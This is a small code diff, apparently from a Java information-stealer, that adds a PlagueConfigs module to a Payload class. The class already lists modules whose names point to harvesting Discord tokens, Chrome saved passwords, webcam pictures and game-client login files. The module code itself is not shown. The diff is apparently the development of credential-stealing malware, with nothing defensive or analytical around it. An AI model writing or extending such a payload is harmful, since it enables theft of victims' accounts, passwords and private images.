@@ -23,6 +23,7 @@ public final class Payload {
                 new ModsFolder(),
                 new UsefulFiles(),
                 new NixwareLogin(),
+                new PlagueConfigs(),
                 new WebcamPicture(),
                 new DiscordTokens(),
                 new ChromePassword(),
